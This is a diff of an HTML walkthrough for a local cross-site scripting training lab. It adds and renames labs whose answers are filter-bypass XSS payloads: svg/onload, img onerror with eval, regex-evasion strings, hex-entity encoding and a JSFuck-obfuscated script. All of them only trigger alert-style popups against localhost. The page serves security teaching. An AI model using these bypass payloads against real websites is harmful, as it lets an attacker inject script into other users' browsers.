@@ -73,11 +73,19 @@
                     <div class="siimple-menu-item"><a href="#lab-13">Lab 13</a></div>
                     <div class="siimple-menu-item"><a href="#lab-14">Lab 14</a></div>
                     <div class="siimple-menu-item"><a href="#lab-15">Lab 15</a></div>
+                    <div class="siimple-menu-item"><a href="#lab-15">Lab 16</a></div>
+                    <div class="siimple-menu-item"><a href="#lab-17">Lab 17</a></div>
+                    <div class="siimple-menu-item"><a href="#lab-18">Lab 18</a></div>
+                    <div class="siimple-menu-item"><a href="#lab-19">Lab 19</a></div>
+                    <div class="siimple-menu-item"><a href="#lab-20">Lab 20</a></div>
+                    <div class="siimple-menu-item"><a href="#lab-21">Lab 21</a></div>
                 </div>
             </div>
 
         </div>
         <div class="siimple-grid-col siimple-grid-col--10">
+
+
 
 
             <div class="siimple-h5" id="getting-started">Getting started</div><br />
@@ -97,7 +105,7 @@
 
 
 
-            <div class="siimple-h5" id="lab-01">Lab 01</div><br />
+            <div class="siimple-h5" id="lab-01">Lab 01 - Let's start from URL</div><br />
             <p class="siimple-p">
                 1. Click on Alert Lab 1<br /><br />
                 <img src="screenshots/screen-02.png" width="500"/><br /><br />
@@ -116,7 +124,7 @@
 
 
 
-            <div class="siimple-h5" href="#lab-02">Lab 02</div><br />
+            <div class="siimple-h5" href="#lab-02">Lab 02 - Form</div><br />
             <p class="siimple-p">
                 1. Click on Alert Lab 2<br /><br />
                 2. Fill in your name on the input field<br /><br />
@@ -135,7 +143,7 @@
 
 
 
-            <div class="siimple-h5" id="lab-03">Lab 03</div><br />
+            <div class="siimple-h5" id="lab-03">Lab 03 - User agent</div><br />
             <p class="siimple-p">
                 1. Click on Alert Lab 3<br /><br />
                 2. Observe that page is displaying the user agent supplied by your browser.<br /><br />
@@ -151,7 +159,7 @@
 
 
 
-            <div class="siimple-h5" id="#=lab-04">Lab 04</div><br />
+            <div class="siimple-h5" id="lab-04">Lab 04 - Referer</div><br />
             <p class="siimple-p">
                 1. Click on Alert Lab 4<br /><br />
                 2. Observe that page is displaying the referrer header value supplied by your browser.<br /><br />
@@ -170,7 +178,7 @@
 
 
 
-            <div class="siimple-h5" id="lab-05">Lab 05</div><br />
+            <div class="siimple-h5" id="lab-05">Lab 05 - Cookie</div><br />
             <p class="siimple-p">
                 1. Click on Alert Lab 5<br /><br />
                 2. Observe that page is displaying the 'alert-labs' cookie value.<br /><br />
@@ -186,7 +194,7 @@
 
 
 
-            <div class="siimple-h5" id="lab-06">Lab 06</div><br />
+            <div class="siimple-h5" id="lab-06">Lab 06 - Local storage</div><br />
             <p class="siimple-p">
                 1. Click on Alert Lab 6<br /><br />
                 2. Observe that page is displaying the 'alert-labs' local storage value.<br /><br />
@@ -202,7 +210,7 @@
 
 
 
-            <div class="siimple-h5" id="lab-07">Lab 07</div><br />
+            <div class="siimple-h5" id="lab-07">Lab 07 - Login page</div><br />
             <p class="siimple-p">
                 1. Click on Alert Lab 7<br /><br />
                 2. Observe that page is displaying a login page.<br /><br />
@@ -222,7 +230,7 @@
 
 
 
-            <div class="siimple-h5" id="lab-08">Lab 08</div><br />
+            <div class="siimple-h5" id="lab-08">Lab 08 - Logged in page</div><br />
             <p class="siimple-p">
                 1. Click on Alert Lab 8<br /><br />
                 2. Observe that page is displaying a login page.<br /><br />
@@ -241,91 +249,9 @@
 
 
 
-            <div class="siimple-h5" id="lab-09">Lab 09</div><br />
+            <div class="siimple-h5" id="lab-09">Lab 09 - Stored XSS</div><br />
             <p class="siimple-p">
-                1. Click on Alert Lab 1<br /><br />
-                2. Your URL would look like &emsp;<code class="siimple-code">http://localhost:8090/step-09.php?status=good</code><br /><br />
-                3. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-09.php?status=&lt;h1&gt;good&lt;/h1&gt;</code><br /><br />
-                4. You have successfully performed HTML injection through a URL parameter.<br /><br />
-                5. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-09.php?status=&lt;script&gt;alert('XSS');&lt;/script&gt;</code><br /><br />
-                6. Observe that the XSS payload is not working.<br /><br />
-                7. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-09.php?status=&lt;script&gt;prompt();&lt;/script&gt;</code><br /><br />
-                8. Observe that the XSS payload is working.<br /><br />
-                9. You have successfully performed a reflected cross-site scripting using <code class="siimple-code">prompt()</code>.<br /><br />
-
-            </p><br /><a href="#getting-started">▲</a><br />
-
-
-
-
-
-            <div class="siimple-h5" id="lab-09">Lab 10</div><br />
-            <p class="siimple-p">
-                1. Click on Alert Lab 10<br /><br />
-                2. Your URL would look like &emsp;<code class="siimple-code">http://localhost:8090/step-10.php?status=good</code><br /><br />
-                3. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-10.php?status=&lt;h1&gt;good&lt;/h1&gt;</code><br /><br />
-                4. You have successfully performed HTML injection through a URL parameter.<br /><br />
-                5. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-10.php?status=&lt;script&gt;alert('XSS');&lt;/script&gt;</code><br /><br />
-                6. Observe that the XSS payload is not working.<br /><br />
-                7. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-10.php?status=&lt;img src=x onerror=alert()&gt;&lt;/img&gt;</code><br /><br />
-                8. Observe that the XSS payload is working.<br /><br />
-                9. You have successfully performed a reflected cross-site scripting using <code class="siimple-code">img</code> tag.<br /><br />
-
-            </p><br /><a href="#getting-started">▲</a><br />
-
-
-
-
-
-            <div class="siimple-h5" id="lab-09">Lab 11</div><br />
-            <p class="siimple-p">
-                1. Click on Alert Lab 11<br /><br />
-                2. Your URL would look like &emsp;<code class="siimple-code">http://localhost:8090/step-11.php?status=good</code><br /><br />
-                3. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-11.php?status=&lt;h1&gt;good&lt;/h1&gt;</code><br /><br />
-                4. You have successfully performed HTML injection through a URL parameter.<br /><br />
-                5. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-11.php?status=&lt;script&gt;alert('XSS');&lt;/script&gt;</code><br /><br />
-                6. Observe that the XSS payload is not working.<br /><br />
-                7. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-11.php?status=&lt;script&gt;prompt();&lt;/script&gt;</code><br /><br />
-                8. Observe that the XSS payload is not working.<br /><br />
-                9. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-11.php?status=&lt;img src=x onerror=alert()&gt;&lt;/img&gt;</code><br /><br />
-                10. Observe that the XSS payload is not working.<br /><br />
-                11. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-11.php?status=&lt;svg/onload=confirm()&gt;</code><br /><br />
-                12. Observe that the XSS payload is working.<br /><br />
-                13. You have successfully performed a reflected cross-site scripting using <code class="siimple-code">svg</code> and <code class="siimple-code">confirm</code>tag.<br /><br />
-
-            </p><br /><a href="#getting-started">▲</a><br />
-
-
-
-
-
-            <div class="siimple-h5" id="lab-09">Lab 12</div><br />
-            <p class="siimple-p">
-                1. Click on Alert Lab 12<br /><br />
-                2. Your URL would look like &emsp;<code class="siimple-code">http://localhost:8090/step-12.php?status=good</code><br /><br />
-                3. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-12.php?status=&lt;h1&gt;good&lt;/h1&gt;</code><br /><br />
-                4. You have successfully performed HTML injection through a URL parameter.<br /><br />
-                5. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-12.php?status=&lt;script&gt;alert('XSS');&lt;/script&gt;</code><br /><br />
-                6. Observe that the XSS payload is not working.<br /><br />
-                7. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-12.php?status=&lt;script&gt;prompt();&lt;/script&gt;</code><br /><br />
-                8. Observe that the XSS payload is not working.<br /><br />
-                9. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-12.php?status=&lt;img src=x onerror=alert()&gt;&lt;/img&gt;</code><br /><br />
-                10. Observe that the XSS payload is not working.<br /><br />
-                11. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-12.php?status=&lt;svg/onload=confirm()&gt;</code><br /><br />
-                12. Observe that the XSS payload is not working.<br /><br />
-                13. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-12.php?status=&lt;&lt;a|ascript&gt;alert(&#39;xss&#39;);&lt;/script&gt;</code><br /><br />
-                14. Observe that the XSS payload is working.<br /><br />
-                15. You have successfully performed a reflected cross-site scripting by bypassing one of the basic RegEx filter used commonly by the developers.<br /><br />
-
-            </p><br /><a href="#getting-started">▲</a><br />
-
-
-
-
-
-            <div class="siimple-h5" id="lab-09">Lab 13</div><br />
-            <p class="siimple-p">
-                1. Click on Alert Lab 13<br /><br />
+                1. Click on Alert Lab 09<br /><br />
                 2. Fill in your name and click on the <b>Send</b> button.<br /><br />
                 3. Observe that the name is being saved and is displayed even if the page is refreshed.<br /><br />
                 4. Put the following XSS payload <code class="siimple-code">&lt;script&gt;alert('XSS');&lt;/script&gt;</code>in the name field and click on the <b>Send</b> button.<br /><br />
@@ -338,26 +264,18 @@
 
 
 
-            <div class="siimple-h5" id="lab-09">Lab 14</div><br />
+            <div class="siimple-h5" id="lab-10">Lab 10 - Base64 encoding</div><br />
             <p class="siimple-p">
-                1. Click on Alert Lab 14<br /><br />
-                2. Submit your name and observe the application behavior.<br /><br />
-                3. Submit the following XSS payload &emsp;<code class="siimple-code">&lt;h1&gt;good&lt;/h1&gt;</code><br /><br />
-                4. You have successfully performed HTML injection.<br /><br />
-                5. Try changing the payload to &emsp;<code class="siimple-code">&lt;script&gt;alert('XSS');&lt;/script&gt;</code><br /><br />
-                6. Observe that the XSS payload is not working.<br /><br />
-                7. Try changing the payload to &emsp;<code class="siimple-code">&lt;script&gt;prompt();&lt;/script&gt;</code><br /><br />
-                8. Observe that the payload payload is not working.<br /><br />
-                9. Try changing the payload to &emsp;<code class="siimple-code">&lt;img src=x onerror=alert()&gt;&lt;/img&gt;</code><br /><br />
-                10. Observe that the XSS payload is not working.<br /><br />
-                11. Try changing the payload to &emsp;<code class="siimple-code">&lt;svg/onload=confirm()&gt;</code><br /><br />
-                12. Observe that the XSS payload is not working.<br /><br />
-                13. Try changing the payload to &emsp;<code class="siimple-code">&lt;&lt;a|ascript&gt;alert(&#39;xss&#39;);&lt;/script&gt;</code><br /><br />
-                14. Observe that the XSS payload is not working.<br /><br />
-                13. Try changing the payload to &emsp;<code class="siimple-code">&lt;img src=&quot;x:gif&quot; onerror=&quot;window[&#39;al\u0065rt&#39;]
-(0)&quot;&gt;&lt;/img&gt;</code><br /><br />
-                14. Observe that the XSS payload is working.<br /><br />
-                15. You have successfully performed a reflected cross-site scripting by bypassing one of the most popular RegEx filter used commonly by the developers.<br /><br />
+                1. Click on Alert Lab 10<br /><br />
+                2. Your URL would look like &emsp;<code class="siimple-code">http://localhost:8090/step-10.php?status=Z29vZA==</code><br /><br />
+                <img src="screenshots/screen-0d.png" width="500"/><br /><br />
+                3. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-10.php?status=%3Cscript%3Ealert(%27XSS%27);%3C/script%3E</code><br /><br />
+                <img src="screenshots/screen-0e.png" width="500"/><br /><br />
+                4. Observe that XSS payload is not working.<br /><br />
+                4. Base64 encode the XSS payload and modify the URL with encoded payload.<br /><br />
+                8. Observe that the XSS payload is working.<br /><br />
+                <img src="screenshots/screen-0f.png" width="500"/><br /><br />
+                9. You have successfully performed a reflected cross-site scripting through a base64 encoded parameter.<br /><br />
 
             </p><br /><a href="#getting-started">▲</a><br />
 
@@ -365,13 +283,129 @@
 
 
 
-            <div class="siimple-h5" id="lab-09">Lab 15</div><br />
+            <div class="siimple-h5" id="lab-11">Lab 11 - Removes alert</div><br />
             <p class="siimple-p">
-                1. Click on Alert Lab 15<br /><br />
-                2. Try solving this by yourself.<br /><br />
+                1. Click on Alert Lab 11<br /><br />
+                2. Your URL would look like &emsp;<code class="siimple-code">http://localhost:8090/step-11.php?status=good</code><br /><br />
+                3. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-11.php?status=&lt;h1&gt;good&lt;/h1&gt;</code><br /><br />
+                4. You have successfully performed HTML injection through a URL parameter.<br /><br />
+                5. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-11.php?status=&lt;script&gt;alert('XSS');&lt;/script&gt;</code><br /><br />
+                6. Observe that the XSS payload is not working.<br /><br />
+                7. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-11.php?status=&lt;script&gt;prompt();&lt;/script&gt;</code><br /><br />
+                8. Observe that the XSS payload is working.<br /><br />
+                9. You have successfully performed a reflected cross-site scripting using <code class="siimple-code">prompt()</code>.<br /><br />
 
-            </p>
+            </p><br /><a href="#getting-started">▲</a><br />
 
+
+
+
+
+            <div class="siimple-h5" id="lab-10">Lab 12 - Removes script</div><br />
+            <p class="siimple-p">
+                1. Click on Alert Lab 12<br /><br />
+                2. Your URL would look like &emsp;<code class="siimple-code">http://localhost:8090/step-12.php?status=good</code><br /><br />
+                3. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-12.php?status=&lt;h1&gt;good&lt;/h1&gt;</code><br /><br />
+                4. You have successfully performed HTML injection through a URL parameter.<br /><br />
+                5. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-12.php?status=&lt;script&gt;alert('XSS');&lt;/script&gt;</code><br /><br />
+                6. Observe that the XSS payload is not working.<br /><br />
+                7. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-12.php?status=&lt;img src=x onerror=alert()&gt;&lt;/img&gt;</code><br /><br />
+                8. Observe that the XSS payload is working.<br /><br />
+                9. You have successfully performed a reflected cross-site scripting using <code class="siimple-code">img</code> tag.<br /><br />
+
+            </p><br /><a href="#getting-started">▲</a><br />
+
+
+
+
+
+            <div class="siimple-h5" id="lab-13">Lab 13 - Removes img, alert, prompt, and script</div><br />
+            <p class="siimple-p">
+                1. Click on Alert Lab 13<br /><br />
+                2. Your URL would look like &emsp;<code class="siimple-code">http://localhost:8090/step-13.php?status=good</code><br /><br />
+                3. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-13.php?status=&lt;h1&gt;good&lt;/h1&gt;</code><br /><br />
+                4. You have successfully performed HTML injection through a URL parameter.<br /><br />
+                5. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-13.php?status=&lt;script&gt;alert('XSS');&lt;/script&gt;</code><br /><br />
+                6. Observe that the XSS payload is not working.<br /><br />
+                7. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-13.php?status=&lt;script&gt;prompt();&lt;/script&gt;</code><br /><br />
+                8. Observe that the XSS payload is not working.<br /><br />
+                9. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-13.php?status=&lt;img src=x onerror=alert()&gt;&lt;/img&gt;</code><br /><br />
+                10. Observe that the XSS payload is not working.<br /><br />
+                11. Try changing the URL to &emsp;<code class="siimple-code">http://localhost:8090/step-13.php?status=&lt;svg/onload=confirm()&gt;</code><br /><br />
+                12. Observe that the XSS payload is working.<br /><br />
+                13. You have successfully performed a reflected cross-site scripting using <code class="siimple-code">svg</code> and <code class="siimple-code">confirm</code>tag.<br /><br />
+
+            </p><br /><a href="#getting-started">▲</a><br />
+
+
+
+
+
+            <div class="siimple-h5" id="lab-14">Lab 14 - Converts < and > to HTML entities</div><br />
+            <p class="siimple-p">
+                I tried to implement this https://securityonline.info/bypass-xss-filtering-using-hex-encoding/
+				but that's not working on latest browsers
+
+            </p><br /><a href="#getting-started">▲</a><br />
+			
+			
+			
+			<div class="siimple-h5" id="lab-15">Lab 15 - Regex filer #1</div><br />
+            <p class="siimple-p">
+                This payload will work - 
+				<code class="siimple-code">&lt;&lt;a|ascript&gt;alert(&#39;xss&#39;);&lt;/script&gt;</code>
+				
+            </p><br /><a href="#getting-started">▲</a><br />
+			
+			
+			<div class="siimple-h5" id="lab-16">Lab 16 - Regex filer #2</div><br />
+            <p class="siimple-p">
+			Thanks to http://www.blackhat.com/presentations/bh-usa-09/VELANAVA/BHUSA09-VelaNava-FavoriteXSS-SLIDES.pdf<br>
+                These payloads will work - <br/>
+				<code class="siimple-code">&lt;img src=&quot;x:alert&quot; onerror=&quot;eval(src%2b&#39;(0)&#39;)&quot;&gt;</code><br/>
+				<code class="siimple-code">&lt;img src=&quot;x:gif&quot; onerror=&quot;eval(&#39;al&#39;%2b&#39;lert(0)&#39;)&quot;&gt;</code><br/>
+				<code class="siimple-code">&lt;img src=&quot;x:gif&quot; onerror=&quot;window[&#39;al\u0065rt&#39;]
+(0)&quot;&gt;&lt;/img&gt;</code><br/>
+				
+            </p><br /><a href="#getting-started">▲</a><br />
+			
+			
+			
+			<div class="siimple-h5" id="lab-17">Lab 17 - Regex filer #3</div><br />
+            <p class="siimple-p">
+                This payload will work - 
+				<code class="siimple-code">%26%23x22%26%23x3e%26%23x3c%26%23x73%26%23x76%26%23x67%26%23x2f%26%23x6f%26%23x6e%26%23x6c%26%23x6f%26%23x61%26%23x64%26%23x3d%26%23x61%26%23x6c%26%23x65%26%23x72%26%23x74%26%23x28%26%23x31%26%23x29%26%23x3e</code>
+				
+            </p><br /><a href="#getting-started">▲</a><br />
+			
+			
+			
+			<div class="siimple-h5" id="lab-20">Lab 20 - Converts special characters to HTML entities on an HTML input value</div><br />
+            <p class="siimple-p">
+                This payload will work - 
+				<code class="siimple-code">%22,%20alert(),%20%22</code>
+				
+            </p><br /><a href="#getting-started">▲</a><br />
+			
+			
+			
+			<div class="siimple-h5" id="lab-21">Lab 21 - Converts special characters to HTML entities on an HTML input value + capitalizes all characters
+</div><br />
+            <p class="siimple-p">
+                This payload will work - 
+				<code class="siimple-code">[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()</code>
+				
+            </p><br /><a href="#getting-started">▲</a><br />
+
+
+
+
+
+
+
+
+
+           
 
 
 
